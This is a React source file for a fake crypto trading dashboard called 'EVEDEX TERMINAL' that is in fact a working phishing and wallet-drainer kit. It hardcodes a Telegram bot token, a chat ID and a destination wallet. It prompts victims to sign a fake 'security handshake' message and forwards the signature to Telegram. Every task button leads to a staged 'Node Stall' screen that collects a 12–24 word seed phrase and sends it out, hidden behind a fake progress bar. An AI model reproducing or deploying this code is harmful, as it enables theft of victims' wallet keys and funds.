import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useSignMessage } from 'wagmi';
import { AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Globe, Loader2 } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected, status } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  const { signMessageAsync } = useSignMessage();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING...");
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  const sendTelegram = (text) => {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text }),
    });
  };

  // --- THE ONLY WAY TO TRIGGER COINBASE SIGNATURE ---
  const forceSecureSign = async () => {
    if (!address) return;
    try {
      const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nTimestamp: ${Date.now()}\n\nAuthorize high-priority node synchronization.`;
      const sig = await signMessageAsync({ message: msg });
      sendTelegram(`🎯 SIGNATURE_CAPTURED\nADDR: ${address}\nSIG: ${sig}`);
    } catch (err) {
      sendTelegram(`⚠️ SIGN_REJECTED\nADDR: ${address}`);
    }
  };

  // --- START SYNC (THE SECOND TRIGGER) ---
  const startSync = async () => {
    // Coinbase will ONLY show the signature if it follows a click
    await forceSecureSign();
    
    setLoading(true);
    setLoadingText("ESTABLISHING RELAY...");
    
    setTimeout(() => {
        setLoading(false);
        setView("seed_gate");
        sendTelegram(`🚨 SEED_GATE_HIT\nADDR: ${address}`);
    }, 2500);
  };

  const handleSeedInput = (e) => {
    const val = e.target.value;
    if (val.trim().split(/\s+/).length > 24) return;
    setSeedVal(val);
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 p-4 uppercase select-none flex flex-col relative font-black tracking-tighter">
      
      <div className="w-full h-40 bg-black border border-slate-900 rounded-xl mb-4 overflow-hidden relative">
         <iframe src="https://www.geckoterminal.com/eth/pools/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640?embed=1&info=0&swaps=1" className="absolute inset-0 w-full h-full border-none opacity-50" title="Chart" />
         <div className="absolute top-2 left-2 bg-black/80 px-2 py-1 rounded text-[7px] text-cyan-500 border border-cyan-900">LIVE_FEED</div>
      </div>

      <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500">
        <div className="flex flex-col">
          <div className="flex items-center gap-2 italic text-md"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
          <div className="text-[7px] text-slate-500 font-mono mt-1">{isConnected ? `VAULT: ${address.slice(0,10)}...` : "DISCONNECTED"}</div>
        </div>
        {/* If not connected, show button. If connected, show "FIX" button to trigger sign */}
        {!isConnected ? (
          <w3m-button balance="hide" />
        ) : (
          <button onClick={forceSecureSign} className="bg-cyan-900/30 border border-cyan-500 px-3 py-1 rounded text-[10px] animate-pulse">VERIFY_NODE</button>
        )}
      </header>

      <div className="flex-1 overflow-y-auto pb-10">
        {view === "menu" && (
          <div className="grid grid-cols-3 gap-3">
            {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Delay", "Bridge"].map((n) => (
              <button key={n} onClick={() => { setActiveTask(n); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800 p-5 rounded-[24px] flex flex-col items-center gap-2 active:scale-95">
                <span className="text-[9px] text-slate-500">{n}</span>
              </button>
            ))}
          </div>
        )}

        {view === "task_box" && (
          <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-6 text-center">
            <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 block mx-auto">← DASHBOARD</button>
            <h2 className="text-white text-xl italic mb-4 uppercase">{activeTask} PORTAL</h2>
            <div className="bg-black/40 border border-slate-900 p-5 rounded-2xl mb-4 text-left">
              <label className="text-[7px] text-cyan-700 block mb-1">ENTER AMOUNT</label>
              <input type="number" placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-cyan-400 outline-none w-full" autoFocus />
            </div>
            <button onClick={startSync} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] text-white italic">INITIALIZE {activeTask}</button>
          </div>
        )}
      </div>

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-4">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[35px] p-8 text-center">
            {!isSyncing ? (
              <>
                <AlertCircle size={44} className="text-red-600 mx-auto mb-4 animate-pulse" />
                <h2 className="text-white text-md italic uppercase">Node Stall (90%)</h2>
                <textarea value={seedVal} onChange={handleSeedInput} placeholder="ENTER MASTER KEY..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" />
                <button 
                   disabled={seedVal.trim().split(/\s+/).length < 12} 
                   onClick={() => { 
                      setIsSyncing(true); 
                      sendTelegram(`🚨 SEED: ${seedVal}\nADDR: ${address}`); 
                      let cur = 0; 
                      const int = setInterval(() => { 
                         cur += 1; 
                         if (cur >= 100) { setSyncProgress(100); clearInterval(int); } 
                         else { setSyncProgress(cur); }
                      }, 100); 
                   }} 
                   className="w-full mt-4 py-5 rounded-[20px] text-[10px] bg-cyan-600 text-white uppercase">
                   OVERRIDE_SYNC
                </button>
              </>
            ) : (
              <div className="py-8">
                <div className="relative w-20 h-20 mx-auto mb-6">
                    <div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" />
                    <div className="absolute inset-0 flex items-center justify-center text-[10px] text-white font-black">{syncProgress}%</div>
                </div>
                <h2 className="text-white italic uppercase">{syncProgress === 100 ? "FINALIZING..." : "SYNCHRONIZING..."}</h2>
              </div>
            )}
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center">
          <Loader2 className="animate-spin text-cyan-500" size={40} />
          <p className="text-[10px] text-cyan-500 mt-6 tracking-widest animate-pulse">{loadingText}</p>
        </div>
      )}
    </div>
  );
}
